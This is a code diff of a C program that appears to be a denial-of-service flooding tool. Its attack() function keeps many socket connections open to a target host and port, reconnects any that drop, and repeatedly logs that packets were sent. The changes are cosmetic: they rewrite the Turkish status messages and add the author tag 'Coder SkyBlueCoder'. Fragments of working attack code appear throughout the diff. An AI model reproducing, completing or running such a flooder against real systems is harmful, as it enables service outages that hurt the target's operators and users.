@@ -13,7 +13,7 @@
 int make_socket(char *host, char *port) {
 	struct addrinfo hints, *servinfo, *p;
 	int sock, r;
-//	fprintf(stderr, "[Connecting -> %s:%s\n", host, port);
+//	fprintf(stderr, "[Baglanildi -> %s:%s\n", host, port);
 	memset(&hints, 0, sizeof(hints));
 	hints.ai_family = AF_UNSPEC;
 	hints.ai_socktype = SOCK_STREAM;
@@ -34,7 +34,7 @@ int make_socket(char *host, char *port) {
 	if(p == NULL) {
 		if(servinfo)
 			freeaddrinfo(servinfo);
-		fprintf(stderr, "Baglanti Kurulamadi\n");
+		fprintf(stderr, "Baglanti Kurulamadi(Ip Adresini veya Ag Baglantinizi Kontrol Ediniz.)\n");
 		exit(0);
 	}
 	if(servinfo)
@@ -66,9 +66,9 @@ void attack(char *host, char *port, int id) {
 				sockets[x] = make_socket(host, port);
 			} else
 //				fprintf(stderr, "Socket[%i->%i] -> %i\n", x, sockets[x], r);
-			fprintf(stderr, "[%i: Gonderildi]\n", id);
+			fprintf(stderr, "[%i: Paket Gonderildi(Coder SkyBlueCoder)]\n", id);
 		}
-		fprintf(stderr, "[%i: Gonderildi]\n", id);
+		fprintf(stderr, "[%i: Paket Gonderildi(Coder SkyBlueCoder)]\n", id);
 		usleep(300000);
 	}
 }
